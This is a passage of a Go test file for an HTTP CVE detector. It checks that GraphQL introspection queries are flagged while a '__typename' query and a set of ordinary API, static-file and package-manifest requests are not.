			t.Fatalf("GraphQL __typename metadata should not trigger introspection CVE, got %+v", match)
		}
	}
	if _, ok := d.DetectFirst(req); ok {
		t.Fatalf("GraphQL __typename metadata should not trigger first CVE match")
	}
}

func TestCVEDetector_GraphQLIntrospectionStillDetected(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/graphql", "", map[string]string{"Content-Type": "application/json"}, []byte(`{"query":"query IntrospectionQuery { __type(name: \"User\") { name fields { name } } }"}`), "application/json")
	matches := d.Detect(req)
	for _, match := range matches {
		if match.CVEID == "CVE-2023-GRAPHQL" {
			return
		}
	}
	t.Fatalf("GraphQL __type introspection should still be detected, got %+v", matches)
}

func TestCVEDetector_NoFalsePositive(t *testing.T) {
	d := NewCVEDetector()

	// Normal requests should not trigger CVE detection
	normalRequests := []struct {
		name  string
		path  string
		query string
		body  string
	}{
		{"simple GET", "/api/users", "page=1&limit=10", ""},
		{"json POST", "/api/login", "", `{"username":"admin","password":"test123"}`},
		{"static file", "/assets/main.css", "", ""},
		{"cdn package manifest", "/npm/@emotion/react@11.11.1/package.json", "", ""},
		{"vscode extension package manifest", "/public/vscode-extensions/v21/extensions/json-language-features/server/package.json", "", ""},
		{"schema package manifest", "/SchemaStore/schemastore/master/src/schemas/json/package.json", "", ""},
	}

	for _, tt := range normalRequests {
		t.Run(tt.name, func(t *testing.T) {
			var bodyBytes []byte
			if tt.body != "" {
				bodyBytes = []byte(tt.body)
			}
			headers := map[string]string{"Host": "example.com"}
			switch tt.name {
			case "cdn package manifest":
				headers["Host"] = "cdn.jsdelivr.net"
			case "vscode extension package manifest":
				headers["Host"] = "codesandbox.io"
			case "schema package manifest":
				headers["Host"] = "raw.githubusercontent.com"
			}
			req := BuildCVERequest(tt.path, tt.query, headers, bodyBytes, "application/json")
			matches := d.Detect(req)
			if len(matches) > 0 {
				t.Errorf("false positive on normal request %q: got %d matches: %v", tt.name, len(matches), matches[0].CVEID)
			}
		})
	}
}
